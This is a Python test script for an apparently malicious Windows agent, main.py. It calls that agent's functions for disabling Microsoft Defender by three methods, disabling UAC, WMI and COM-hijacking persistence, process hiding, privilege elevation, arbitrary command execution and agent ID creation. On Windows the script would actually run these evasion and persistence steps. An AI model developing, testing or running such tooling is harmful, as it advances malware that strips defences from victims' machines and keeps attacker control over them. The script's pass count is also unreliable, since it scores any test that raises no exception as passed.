#!/usr/bin/env python3
"""
Test script for main.py to verify cross-platform compatibility
"""

import sys
import platform

def test_imports():
    """Test that all imports work correctly."""
    print("Testing imports...")
    try:
        import main
        print("✓ Main module imported successfully")
        return True
    except Exception as e:
        print(f"✗ Import failed: {e}")
        return False

def test_platform_detection():
    """Test platform detection."""
    print("\nTesting platform detection...")
    import main
    print(f"Platform: {platform.system()}")
    print(f"WINDOWS_AVAILABLE: {main.WINDOWS_AVAILABLE}")
    print("✓ Platform detection working")

def test_powershell_functions():
    """Test PowerShell-related functions on non-Windows platforms."""
    print("\nTesting PowerShell functions...")
    import main
    
    # Test PowerShell functions should return False on Linux
    functions_to_test = [
        main.disable_defender_powershell,
        main.disable_defender_group_policy,
        main.disable_defender_service,
        main.setup_wmi_persistence,
        main.setup_com_hijacking_persistence,
        main.hide_process,
        main.disable_uac,
        main.run_as_admin,
        main.setup_persistence,
    ]
    
    for func in functions_to_test:
        try:
            result = func()
            if not main.WINDOWS_AVAILABLE and result is False:
                print(f"✓ {func.__name__}: Correctly returned False on Linux")
            elif main.WINDOWS_AVAILABLE:
                print(f"✓ {func.__name__}: Executed on Windows")
            else:
                print(f"✗ {func.__name__}: Unexpected result {result}")
        except Exception as e:
            print(f"✗ {func.__name__}: Error - {e}")

def test_command_execution():
    """Test command execution function."""
    print("\nTesting command execution...")
    import main
    
    try:
        # Test a simple command
        result = main.execute_command("echo 'Hello World'")
        print(f"✓ Command execution: {result[:50]}...")
    except Exception as e:
        print(f"✗ Command execution failed: {e}")

def test_agent_id():
    """Test agent ID generation."""
    print("\nTesting agent ID generation...")
    import main
    
    try:
        agent_id = main.get_or_create_agent_id()
        print(f"✓ Agent ID: {agent_id}")
    except Exception as e:
        print(f"✗ Agent ID generation failed: {e}")

def main():
    """Run all tests."""
    print("=" * 60)
    print("Testing main.py cross-platform compatibility")
    print("=" * 60)
    
    tests = [
        test_imports,
        test_platform_detection,
        test_powershell_functions,
        test_command_execution,
        test_agent_id,
    ]
    
    passed = 0
    total = len(tests)
    
    for test in tests:
        try:
            test()  # Just call the test function
            passed += 1  # If no exception, test passed
        except Exception as e:
            print(f"✗ Test {test.__name__} failed with exception: {e}")
    
    print("\n" + "=" * 60)
    print(f"Test Results: {passed}/{total} tests passed")
    print("=" * 60)
    
    if passed == total:
        print("🎉 All tests passed! The main.py file is working correctly.")
        return 0
    else:
        print("❌ Some tests failed. Please check the errors above.")
        return 1

if __name__ == "__main__":
    sys.exit(main())